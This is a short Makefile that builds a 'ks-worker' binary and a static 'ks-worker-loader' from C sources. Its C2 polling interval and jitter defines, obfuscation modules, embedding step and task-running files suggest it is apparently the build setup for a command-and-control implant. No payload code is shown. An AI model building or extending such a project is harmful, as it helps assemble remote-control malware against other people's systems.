CC ?= cc
CFLAGS ?= -O2 -Wall -Wextra -Werror -Iinclude
LDLIBS ?= -lssl -lcrypto
WORKER_DEFINES ?= -DC2_POLL_INTERVAL=23 -DC2_POLL_JITTER=7
WORKER_SRC := src/worker.c src/http.c src/task_parse.c src/task_run.c \
              src/obfuscate.c src/obfuscate_data.c
WORKER_HDR := include/obfuscate.h include/http.h include/tasks.h

src/obfuscate_data.c:
	$(error run scripts/embed_worker.py first (see deploy/README.md))

all: ks-worker ks-worker-loader

ks-worker: $(WORKER_SRC) $(WORKER_HDR)
	$(CC) $(CFLAGS) $(WORKER_DEFINES) -o $@ $(WORKER_SRC) $(LDLIBS)

ks-worker-loader: src/loader.c
	$(CC) -O2 -Wall -Wextra -Werror -static -o $@ src/loader.c

clean:
	rm -f ks-worker ks-worker-loader
